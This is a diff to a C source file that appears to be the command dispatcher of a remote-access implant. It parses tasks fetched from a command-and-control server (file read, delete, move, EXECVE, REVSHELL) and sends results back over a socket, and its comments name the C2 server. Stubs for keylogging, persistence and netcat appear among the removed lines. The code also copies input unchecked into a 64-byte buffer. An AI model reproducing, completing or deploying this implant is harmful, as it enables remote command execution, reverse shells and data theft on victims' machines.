@@ -5,31 +5,49 @@
 #include "choice.h"
 #include "tasks.h"
 #include "connexion.h"
+#include "base64.h"
 
-#include <string.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <stddef.h>  // For NULL
-#include <unistd.h>  // For close
+#include <string.h>
+#include <unistd.h>
 
 void choice(char * buffer_fetch, char * user_ID) {
-    char buffer[1024];
-    strcpy(buffer, buffer_fetch); // Create a copy to avoid modifying original
+    // Variables for task handling
+    char command[64] = {0};
+    char *task_ID = NULL;
+    char task_result[1024*1024] = {0}; // Buffer for task results
 
-    char * command = strtok(buffer, ",");
-    char * task_result = malloc(1024 * 1024); // Allocate large buffer for results
-    if (task_result == NULL) {
-        perror("Memory allocation failed");
+    // Check if there's a command to process
+    if (buffer_fetch == NULL || strlen(buffer_fetch) == 0) {
+        printf("No command received\n");
         return;
     }
-    task_result[0] = '\0'; // Initialize as empty string
 
-    char * task_ID = NULL;
+    // Extract the command (first part before comma)
+    char *buffer_copy = strdup(buffer_fetch);
+    if (buffer_copy == NULL) {
+        printf("Memory allocation error\n");
+        return;
+    }
 
+    char *token = strtok(buffer_copy, ",");
+    if (token != NULL) {
+        strcpy(command, token);
+    } else {
+        printf("Invalid command format\n");
+        free(buffer_copy);
+        return;
+    }
+    free(buffer_copy);
+
+    printf("Command received: %s\n", command);
+
+    // Process command based on type
     if (strcmp(command, "SLEEP") == 0) {
         task_ID = sleep_task(buffer_fetch, task_result);
         if (task_ID != NULL) {
-            task_result[0] = '\0';
+            printf("Sleep task completed, task ID: %s\n", task_ID);
         }
     }
     else if (strcmp(command, "CAT") == 0) {
@@ -39,74 +57,71 @@ void choice(char * buffer_fetch, char * user_ID) {
             printf("Result length: %zu bytes\n", strlen(task_result));
         }
     }
-    else if (strcmp(command, "EXECVE") == 0) {
-        printf("EXECVE command received\n");
-    }
-    else if (strcmp(command, "LOCATE") == 0) {
-        printf("LOCATE command received\n");
-    }
-    else if (strcmp(command, "REVSHELL") == 0) {
-        printf("REVSHELL command received\n");
-    }
-    else if (strcmp(command, "KEYLOG") == 0) {
-        printf("KEYLOG command received\n");
-    }
-    else if (strcmp(command, "PERSIST") == 0) {
-        printf("PERSIST command received\n");
-    }
-    else if (strcmp(command, "MV") == 0) {
-    	task_ID = mv_task(buffer_fetch);
-    	if (task_ID != NULL) {
-        	task_result[0] = '\0';
-    }
-}
     else if (strcmp(command, "RM") == 0) {
         task_ID = rm_task(buffer_fetch);
-    	if (task_ID != NULL) {
-        	task_result[0] = '\0';
-    	}
+        if (task_ID != NULL) {
+            printf("Remove task completed, task ID: %s\n", task_ID);
+            task_result[0] = '\0'; // No results to send back
+        }
     }
-    else if (strcmp(command, "PS") == 0) {
-        printf("PS command received\n");
+    else if (strcmp(command, "MV") == 0) {
+        task_ID = mv_task(buffer_fetch);
+        if (task_ID != NULL) {
+            printf("Move task completed, task ID: %s\n", task_ID);
+            task_result[0] = '\0'; // No results to send back
+        }
     }
-    else if (strcmp(command, "NETCAT") == 0) {
-        printf("NETCAT command received\n");
+    else if (strcmp(command, "EXECVE") == 0) {
+        task_ID = execve_task(buffer_fetch, task_result);
+        if (task_ID != NULL) {
+            printf("Execve task completed, task ID: %s\n", task_ID);
+            printf("Result length: %zu bytes\n", strlen(task_result));
+        }
+    }
+    else if (strcmp(command, "REVSHELL") == 0) {
+        task_ID = revshell_task(buffer_fetch, task_result);
+        if (task_ID != NULL) {
+            printf("Reverse shell task initiated, task ID: %s\n", task_ID);
+            task_result[0] = '\0'; // No results to send back
+        }
     }
     else {
         printf("Unknown command: %s\n", command);
+        return;
     }
 
-    // Here you would send the results back to the C2 server
-    // Format: RESULT,task_ID,user_ID,task_result (base64)
-    if (task_ID != NULL) {
-        printf("Task completed - User ID: %s, Task ID: %s\n", user_ID, task_ID);
-
-        // Create a response message for the C2 server
-        char *response = malloc(1024 * 1024 + 512); // Allocate large buffer for response
-        if (response == NULL) {
-            perror("Memory allocation failed for response");
-            free(task_ID);
-            free(task_result);
-            return;
-        }
-
-        // Format the response: RESULT,task_ID,user_ID,task_result
-        snprintf(response, 1024 * 1024 + 512, "RESULT,%s,%s,%s\n", user_ID, task_ID, task_result);
-
-        // Open a new socket connection to the C2 server
-        int sock_result = sock_init();
-        if (sock_result != -1) {
-            char buffer_response[1024] = {0};
-            send_message(sock_result, response, buffer_response);
-            printf("Result sent to server, response: %s\n", buffer_response);
-            close(sock_result);
-        } else {
-            printf("Failed to send result to server\n");
-        }
-
-        free(response);
-        free(task_ID); // Free the task_ID allocated by the task function
+    // Check if task execution was successful
+    if (task_ID == NULL) {
+        printf("Task execution failed\n");
+        return;
     }
 
-    free(task_result);
+    // Send result back to C2 server
+    int sock_result = sock_init();
+    if (sock_result == -1) {
+        printf("Failed to initialize socket for result\n");
+        free(task_ID);
+        return;
+    }
+
+    // Format result message: RESULT,USER_ID,TASK_ID,RESULT_DATA
+    char *result_message = malloc(strlen(task_result) + 256);
+    if (result_message == NULL) {
+        printf("Memory allocation failed for result message\n");
+        close(sock_result);
+        free(task_ID);
+        return;
+    }
+
+    sprintf(result_message, "RESULT,%s,%s,%s", user_ID, task_ID, task_result);
+
+    // Send result to C2
+    char response_buffer[1024] = {0};
+    send_message(sock_result, result_message, response_buffer);
+    printf("Result sent to C2, response: %s\n", response_buffer);
+
+    // Cleanup
+    close(sock_result);
+    free(result_message);
+    free(task_ID);
 }
